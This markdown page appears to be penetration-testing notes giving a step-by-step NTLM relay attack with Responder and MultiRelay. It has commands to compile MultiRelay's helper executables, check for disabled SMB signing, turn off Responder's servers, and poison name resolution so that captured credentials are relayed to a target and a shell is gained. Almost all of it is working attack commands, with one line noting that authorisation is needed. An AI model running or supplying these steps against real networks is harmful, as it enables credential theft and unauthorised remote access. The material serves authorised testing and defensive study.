# NTLM relay attack

## Attack tree

```text
1 Set up MultiRelay
2 Run responder
3 Wait for it
```

## Examples

1. Install dependencies and compile some artifacts used by Multirelay:

```text
# apt install gcc-mingw-w64-x86-64 python-crypto
# cd /usr/share/responder/tools/
# x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv                                                                                                         
# x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode
# pip install pycryptodome
```

2. Test with:

```text
# cd /usr/share/responder/tools
# python3 MultiRelay.py
```

3. For this attack to work with SMB, SMB signing has to be disabled on the target. Usually it is disabled, but this can be
checked using the nmap `smb-security-mode` script:

```text
# nmap -p445 --script=smb-security-mode <target IP address>
```

4. The MultiRelay script uses HTTP and SMB ports. To prevent conflicts, turn these servers off in the 
`/usr/share/responder/responder.conf` file.

```text
SMB = Off
HTTP = Off
```

5. If SMB signing is disabled, run MultiRelay with (`-t`) to specify the target and (`-u`) to specify users to 
relay (forward) to. Choose selectively to create minimal noise in the network.

```text
# python3 MultiRelay.py -t <target IP address> -u ALL -d
```

6. In another terminal, use `ifconfig` to find NIC <interface> of attack machine for running responder.
7. Run responder:

```text
# cd Responder
# responder -I <interface> -rv
```
8. Wait for a connection: Hopefully, someone mistypes trying to open a shared drive (a drive that does not exist). 
Responder intervenes and poisons the request. SMB relaying is now setup in `MultiRelay.py`, and the credential is 
forwarded to the <target IP address> and we have gained a shell on it.

## Notes

If it is possible to poison responses but not possible to crack the hash, an option is to try to relay. A relay or 
forwarder receives valid authentication and then forwards that request to another server/system and 
tries to authenticate to that server/system by using the valid credentials received.

* Activity can vary wildly depending on the network. 
* Inactive networks can take days or weeks before a connection can be hijacked. 
* Logs are created in `/usr/share/responder/logs` where you can look past sessions captured. 
* MultiRelay runs mimikatz by default and may be easily flagged by antivirus products. 
* The attacks described here should only be performed when explicitly authorised to do so. 

## Tools

* [Responder](https://github.com/lgandx/Responder)
* [smb-security-mode](https://nmap.org/nsedoc/scripts/smb-security-mode.html)